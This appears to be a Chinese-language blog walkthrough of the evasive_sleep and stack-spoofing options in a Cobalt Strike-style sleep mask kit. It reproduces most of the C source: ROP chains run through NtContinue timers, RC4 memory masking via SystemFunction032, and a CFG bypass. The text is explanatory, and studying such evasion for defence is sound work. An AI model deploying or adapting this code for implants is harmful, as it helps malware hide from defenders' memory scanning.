<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="690d1b11b2128065f0d2786727be7624">evasive_sleep： RC4混淆</h3>
<p>在sleepmask_kit中，用到EVASIVE_SLEEP函数，默认是关闭的，要使用就自己改成1。他会对sleep后的BOF内存数据进行再一次的混淆遮掩</p>
<div class="highlight"><pre><span></span><span class="cm">/* EVASIVE_SLEEP information:</span>
<span class="cm"> *   Depending on how large your sleep mask code/data becomes you may need to modify</span>
<span class="cm"> *   the ImageSize and Img.Length variables in evasive_sleep.c in order to fully</span>
<span class="cm"> *   mask the sleep mask BOF memory.</span>
<span class="cm"> *</span>
<span class="cm"> *   EVASIVE_SLEEP is not supported on x86.</span>
<span class="cm"> */</span>
<span class="cp">#if _WIN64</span>
<span class="cp">#define EVASIVE_SLEEP 0</span>
<span class="c1">// #define EVASIVE_SLEEP 1 自己改成1</span>
<span class="cp">#endif</span>
</pre></div>
<p>若使用他，则查看evasive_sleep.c文件</p>
<div class="highlight"><pre><span></span><span class="cp">#if EVASIVE_SLEEP</span>
<span class="cp">#include</span> <span class="cpf">"evasive_sleep.c"</span><span class="cp"></span>
<span class="c1">// #include "evasive_sleep_stack_spoof.c"</span>
<span class="cp">#endif</span>
</pre></div>
<p>具体的调用在下面，调用evasive_sleep，位于sleep_mask对内存数据的加密中间，的又一次加密</p>
<div class="highlight"><pre><span></span><span class="cm">/* do not change the sleep_mask function parameters */</span>
<span class="kt">void</span> <span class="nf">sleep_mask</span><span class="p">(</span><span class="n">SLEEPMASKP</span> <span class="o">*</span> <span class="n">parms</span><span class="p">,</span> <span class="kt">void</span><span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="n">pSleep</span><span class="p">)(</span><span class="n">DWORD</span><span class="p">),</span> <span class="n">DWORD</span> <span class="n">time</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">......</span>
        <span class="cm">/* Mask the beacons sections and heap memory */</span>
        <span class="n">mask_sections</span><span class="p">(</span><span class="n">parms</span><span class="p">);</span>
        <span class="n">mask_heap</span><span class="p">(</span><span class="n">parms</span><span class="p">);</span>
    <span class="p">......</span>

        <span class="cp">#if EVASIVE_SLEEP</span>
        <span class="n">evasive_sleep</span><span class="p">(</span><span class="n">parms</span><span class="o">-&gt;</span><span class="n">mask</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">);</span>
    <span class="p">......</span>
        <span class="cm">/* Call the masking functions again in reverse order to unmask the heap and sections */</span>
        <span class="n">mask_heap</span><span class="p">(</span><span class="n">parms</span><span class="p">);</span>
        <span class="n">mask_sections</span><span class="p">(</span><span class="n">parms</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>evasive_sleep，使用了ROP技术，相关注释在代码里<br/>
一个上下文包含所有的寄存器，可以存放相关地址</p>
<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="nf">DECLSPEC_ALIGN</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="n">DECLSPEC_NOINITALL</span> <span class="n">_CONTEXT</span> <span class="p">{</span>
    <span class="c1">// Control flags.</span>
    <span class="n">DWORD</span> <span class="n">ContextFlags</span><span class="p">;</span>
    <span class="c1">// Integer registers</span>
    <span class="n">DWORD</span> <span class="n">R0</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R1</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R2</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R3</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R4</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R5</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R6</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R7</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R8</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R9</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R10</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R11</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">R12</span><span class="p">;</span>
    <span class="c1">// Control Registers</span>
    <span class="n">DWORD</span> <span class="n">Sp</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">Lr</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">Pc</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">Cpsr</span><span class="p">;</span>
    <span class="p">..............</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">evasive_sleep</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">mask</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">time</span><span class="p">,</span> <span class="n">BEACON_INFO</span> <span class="o">*</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 保存上下文信息</span>
    <span class="n">CONTEXT</span> <span class="n">CtxThread</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopProtRW</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopMemMsk</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopProtRX</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopSetEvt</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="n">HANDLE</span>  <span class="n">hTimerQueue</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">HANDLE</span>  <span class="n">hNewTimer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">HANDLE</span>  <span class="n">hEvent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span>   <span class="n">ImageBase</span> <span class="o">=</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">sleep_mask_ptr</span><span class="p">;</span>
    <span class="n">DWORD</span>   <span class="n">ImageTextSize</span> <span class="o">=</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">sleep_mask_text_size</span><span class="p">;</span>
    <span class="n">DWORD</span>   <span class="n">OldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">USTRING</span> <span class="n">Key</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">USTRING</span> <span class="n">Img</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

<span class="cp">#if CFG_BYPASS</span>
    <span class="cm">/* Using this variable which is not set 1st time through to only do the CFG bypass once */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">initialize</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">markCFGValid_nt</span><span class="p">(</span><span class="n">NtContinue</span><span class="p">);</span>
       <span class="n">initialize</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">#endif</span>

    <span class="cm">/* setup the parameters to the functions */</span>
    <span class="n">Key</span><span class="p">.</span><span class="n">Buffer</span> <span class="o">=</span> <span class="n">mask</span><span class="p">;</span>
    <span class="n">Key</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">Key</span><span class="p">.</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">MASK_SIZE</span><span class="p">;</span>
    <span class="n">Img</span><span class="p">.</span><span class="n">Buffer</span> <span class="o">=</span> <span class="n">ImageBase</span><span class="p">;</span>
    <span class="n">Img</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">Img</span><span class="p">.</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">sleep_mask_total_size</span><span class="p">;</span>

    <span class="c1">// 创建事件和计时器队列</span>
    <span class="n">hEvent</span> <span class="o">=</span> <span class="n">CreateEventA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">hTimerQueue</span> <span class="o">=</span> <span class="n">CreateTimerQueue</span><span class="p">();</span>
    <span class="c1">// 创建计时器队列定时器</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hEvent</span> <span class="o">&amp;&amp;</span> <span class="n">hTimerQueue</span> <span class="o">&amp;&amp;</span> <span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">RtlCaptureContext</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">))</span> <span class="p">{</span>
        <span class="c1">// 等待0x32毫秒</span>
        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hEvent</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">);</span> <span class="c1">// This is needed</span>

        <span class="cm">/* Setup the function calls to be added to the queue timer */</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopProtRW</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopMemMsk</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopProtRX</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopSetEvt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>

        <span class="c1">// 构造ROP链，遵循X64寄存器调用规定</span>
         <span class="c1">// VirtualProtect( ImageBase, ImageTextSize, PAGE_READWRITE, &amp;OldProtect );</span>
        <span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">VirtualProtect</span><span class="p">;</span>
        <span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">ImageBase</span><span class="p">;</span>
        <span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageTextSize</span><span class="p">;</span>
        <span class="n">RopProtRW</span><span class="p">.</span><span class="n">R8</span> <span class="o">=</span> <span class="n">PAGE_READWRITE</span><span class="p">;</span>
        <span class="n">RopProtRW</span><span class="p">.</span><span class="n">R9</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">;</span>

        <span class="c1">// 核心加密函数，SystemFunction032做RC4加密，可以替换成其他函数，自实现也可以</span>
        <span class="c1">// SystemFunction032( &amp;Key, &amp;Img );</span>
        <span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">SystemFunction032</span><span class="p">;</span>
        <span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Img</span><span class="p">;</span>
        <span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Key</span><span class="p">;</span>

        <span class="c1">// VirtualProtect( ImageBase, ImageTextSize, PAGE_EXECUTE_READ, &amp;OldProtect );</span>
        <span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">VirtualProtect</span><span class="p">;</span>
        <span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">ImageBase</span><span class="p">;</span>
        <span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageTextSize</span><span class="p">;</span>
        <span class="n">RopProtRX</span><span class="p">.</span><span class="n">R8</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">;</span>
        <span class="n">RopProtRX</span><span class="p">.</span><span class="n">R9</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">;</span>

        <span class="c1">// SetEvent( hEvent );</span>
        <span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">SetEvent</span><span class="p">;</span>
        <span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">hEvent</span><span class="p">;</span>

        <span class="c1">// 指定时间间隔后触发NtContinue，执行设置的ROP操作</span>
        <span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopProtRW</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
        <span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopMemMsk</span><span class="p">,</span> <span class="mi">400</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
        <span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopMemMsk</span><span class="p">,</span> <span class="mi">600</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
        <span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopProtRX</span><span class="p">,</span> <span class="mi">800</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
        <span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopSetEvt</span><span class="p">,</span> <span class="mi">999</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>

        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hEvent</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">time</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* cleanup */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hEvent</span><span class="p">)</span>      <span class="p">{</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hEvent</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hTimerQueue</span><span class="p">)</span> <span class="p">{</span> <span class="n">DeleteTimerQueue</span><span class="p">(</span><span class="n">hTimerQueue</span><span class="p">);</span> <span class="p">}</span>
<span class="p">}</span>
<span class="c1">//#endif</span>
</pre></div>
<p>总结：EVASIVE_SLEEP二次混淆的核心思路是，利用context作为参数，传递给<code>NtContinue</code>调用rop gadget，其中ROP链子调用SystemFunction032做RC4加密</p>
<hr/>
<h3 data-content="1" id="b6e345aa8c452dad7528aa27d5a9c317">堆栈欺骗（spoof stack+ROP）</h3>
<p>启用：把evasive_sleep_stack_spoof.c的注释去掉</p>
<div class="highlight"><pre><span></span><span class="cp">#if EVASIVE_SLEEP</span>
<span class="cp">#include</span> <span class="cpf">"evasive_sleep.c"</span><span class="cp"></span>
<span class="c1">// #include "evasive_sleep_stack_spoof.c"</span>
<span class="cp">#endif</span>
</pre></div>
<p>这里的evasive_sleep_stack_spoof其实是evasive_sleep的进阶版，所以选择这个就得把上面的给注释掉<br/>
还是跟进evasive_sleep。这里和evasive_sleep.c的共同点在于，一套统一的模板，CONTEXT做上下文参数，构造ROP链，用<code>NtContinue</code>进行调度执行。</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">evasive_sleep</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">mask</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">time</span><span class="p">,</span> <span class="n">BEACON_INFO</span> <span class="o">*</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">CONTEXT</span> <span class="n">CtxThread</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopProtRW</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopMemMsk</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopProtRX</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">CONTEXT</span> <span class="n">RopSetEvt</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="p">......</span>
</pre></div>
<p>但是这里的ROP链有不同，首先调用<code>spoof_stack</code>，然后分配RW，两次RC4加密，最后调用<code>restore_stack</code></p>
<div class="highlight"><pre><span></span><span class="cm">/* Setup the function calls to be added to the queue timer */</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopProtRW</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopMemMsk</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopProtRX</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RopSetEvt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>

<span class="c1">// VirtualProtect( ImageBase, ImageTextSize, PAGE_READWRITE, &amp;OldProtect );</span>
<span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
<span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">VirtualProtect</span><span class="p">;</span>
<span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">ImageBase</span><span class="p">;</span>
<span class="n">RopProtRW</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageTextSize</span><span class="p">;</span>
<span class="n">RopProtRW</span><span class="p">.</span><span class="n">R8</span> <span class="o">=</span> <span class="n">PAGE_READWRITE</span><span class="p">;</span>
<span class="n">RopProtRW</span><span class="p">.</span><span class="n">R9</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">;</span>

<span class="c1">// SystemFunction032( &amp;Key, &amp;Img );</span>
<span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
<span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">SystemFunction032</span><span class="p">;</span>
<span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Img</span><span class="p">;</span>
<span class="n">RopMemMsk</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Key</span><span class="p">;</span>

<span class="c1">// VirtualProtect( ImageBase, ImageTextSize, PAGE_EXECUTE_READ, &amp;OldProtect );</span>
<span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
<span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">VirtualProtect</span><span class="p">;</span>
<span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">ImageBase</span><span class="p">;</span>
<span class="n">RopProtRX</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageTextSize</span><span class="p">;</span>
<span class="n">RopProtRX</span><span class="p">.</span><span class="n">R8</span> <span class="o">=</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">;</span>
<span class="n">RopProtRX</span><span class="p">.</span><span class="n">R9</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">OldProtect</span><span class="p">;</span>

<span class="c1">// SetEvent( hEvent );</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">SetEvent</span><span class="p">;</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">hEvent</span><span class="p">;</span>

<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">spoof_stack</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadId</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopProtRW</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopMemMsk</span><span class="p">,</span> <span class="mi">300</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopMemMsk</span><span class="p">,</span> <span class="mi">400</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopProtRX</span><span class="p">,</span> <span class="mi">500</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">restore_stack</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadId</span><span class="p">,</span> <span class="mi">600</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>
<span class="n">CreateTimerQueueTimer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hNewTimer</span><span class="p">,</span> <span class="n">hTimerQueue</span><span class="p">,</span> <span class="p">(</span><span class="n">WAITORTIMERCALLBACK</span><span class="p">)</span> <span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopSetEvt</span><span class="p">,</span> <span class="mi">700</span> <span class="o">+</span> <span class="n">time</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WT_EXECUTEINTIMERTHREAD</span><span class="p">);</span>

